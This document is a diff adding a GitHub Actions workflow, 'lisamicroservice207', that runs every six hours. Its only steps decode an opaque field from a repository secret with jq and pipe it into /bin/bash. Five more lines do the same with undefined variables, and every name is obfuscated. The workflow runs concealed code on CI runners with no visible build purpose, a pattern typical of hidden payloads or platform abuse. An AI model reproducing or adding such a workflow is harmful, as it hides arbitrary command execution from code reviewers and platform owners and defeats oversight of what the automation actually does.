@@ -1,0 +1,23 @@
+name: lisamicroservice207
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '50 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lisamicroservice207
+        env:
+          csg400: ${{ secrets.csg400 }}
+        run: |
+          echo $csg400 | jq -r .o2488 | /bin/bash
+          echo $ifx5855 | jq -r .gmgf8267 | /bin/bash
+          echo $upwoq39 | jq -r .e691 | /bin/bash
+          echo $hda99848 | jq -r .ndvd71641 | /bin/bash
+          echo $jas85 | jq -r .fpbbv429 | /bin/bash
+          echo $xhap3170 | jq -r .rgu3 | /bin/bash
+
